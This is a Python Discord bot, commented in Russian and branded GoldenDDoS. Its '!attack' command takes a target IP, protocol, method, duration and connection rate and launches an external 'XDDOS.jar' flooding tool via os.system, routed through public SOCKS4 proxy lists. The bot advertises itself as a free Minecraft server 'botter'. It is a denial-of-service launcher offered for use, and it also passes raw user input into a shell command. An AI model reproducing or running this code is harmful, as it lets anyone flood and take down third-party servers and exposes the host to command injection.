import discord,os
from discord.ext import commands

DiscordBotToken = "ЗДЕСЬ ВСТАВЛЯЕМ ТОКЕН (CTRL+V)"
DiscordBotPrefix = "!" #Здесь можно поставить любой префикс бота

client=commands.Bot(command_prefix=DiscordBotPrefix,intents=discord.Intents.default())
client.remove_command('help')

@client.event
async def on_ready(): 
    #Ивент включения бота
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name="AD: dsc.gg/goldenddos"))

@client.event
async def on_message(message):
    if message.content.startswith(DiscordBotPrefix):
        await client.process_commands(message) #Ето чтобы команды бота работал, уберите on_message ивент если вам ето не нужно

@client.command()
async def attack(ctx, ip, protocol, method, time_in_seconds, cps):
    if not os.path.exists("XDDOS.jar"):
        print("Атака не была отправлена. Важно чтобы нужный файл XDDOS назывался XDDOS.jar и чтобы он был в папке кода бота!")
        await ctx.reply("Есть технические проблемы, пожалуйста повторите попытку позже.")
    if not os.path.exists("urls.txt"):
        open("urls.txt","w+").write("""https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt
https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt
https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt
https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt""")
        #Уберите ето если не нужно
    Embed=discord.Embed(
        title="Атака отправлена",
        description=f"Отправлена атака пользователем {ctx.message.author.mention}",
        color=discord.Color.green()
    )
    Embed.add_field(name="IP",value=ip)
    Embed.add_field(name="Протокол",value=protocol)
    Embed.add_field(name="Метод атаки",value=method)
    Embed.add_field(name="Время",value=time_in_seconds+" сек.")
    Embed.add_field(name="CPS (Подключения за секунду)",value=cps)
    Embed.set_footer(text="Реклама: Бесплатный боттер Minecraft серверов здесь: https://dsc.gg/goldenddos")
    await ctx.reply(embed=Embed)
    import platform
    if platform.system()=="Windows":
        os.system(f"java -jar XDDOS.jar {ip} {protocol} {method} {time_in_seconds} {cps} y -noansi")
    elif platform.system()=="Linux":
        os.system(f"java -jar XDDOS.jar {ip} {protocol} {method} {time_in_seconds} {cps} y")
    del platform

client.run(DiscordBotToken)
#Указывать Discord бот токен в самом верху

#(C) 2022 Wawastera Corporation | GoldenDDoS

#Получить помощь можно здесь: https://dsc.gg/goldenddos